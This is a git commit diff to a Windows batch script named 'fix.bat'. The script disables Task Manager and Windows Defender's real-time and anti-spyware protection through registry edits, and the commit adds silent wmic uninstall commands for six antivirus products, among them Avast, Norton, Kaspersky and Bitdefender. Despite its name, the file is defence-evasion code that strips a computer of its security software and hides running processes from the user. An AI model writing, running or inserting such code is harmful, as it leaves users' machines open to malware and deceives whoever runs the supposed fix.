4ad56aec1f0839743f32981a1b913fe89586a4a7
MidlesLex <154219383+MidlesLex@users.noreply.github.com>
2024-02-14 20:10:42 +0100

    Update fix.bat

--- fix.bat
+++ fix.bat
@@ -2,3 +2,10 @@
 REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+
+wmic product where "name like '%%Avast%%Free%%Antivirus%%'" call uninstall /nointeractive
+wmic product where "name like '%%AVG%%Antivirus%%'" call uninstall /nointeractive
+wmic product where "name like '%%McAfee%%Antivirus%%'" call uninstall /nointeractive
+wmic product where "name like '%%Norton%%Security%%'" call uninstall /nointeractive
+wmic product where "name like '%%Kaspersky%%Antivirus%%'" call uninstall /nointeractive
+wmic product where "name like '%%Bitdefender%%'" call uninstall /nointeractive
